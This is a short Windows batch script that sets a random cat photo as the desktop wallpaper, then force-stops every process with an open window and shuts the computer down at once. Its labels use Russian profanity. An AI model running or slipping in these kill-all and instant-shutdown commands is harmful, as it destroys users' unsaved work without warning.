@echo off
setlocal EnableDelayedExpansion
chcp 65001

set photo_dir=D:\media\cute-cats\

if "%~1"=="блять" goto blyat

:suka
    set /a total_photos = 0
    for %%f in (%photo_dir%*.jpeg %photo_dir%*.jpg %photo_dir%*.bmp %photo_dir%*.png) do (
        set "list[!total_photos!]=%%~f"
        set /a total_photos += 1
    )

    set /a random_index = (%random% %% %total_photos%)

    REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "!list[%random_index%]!" /f 
    RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
    
    powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"

:blyat
    shutdown /s /t 0
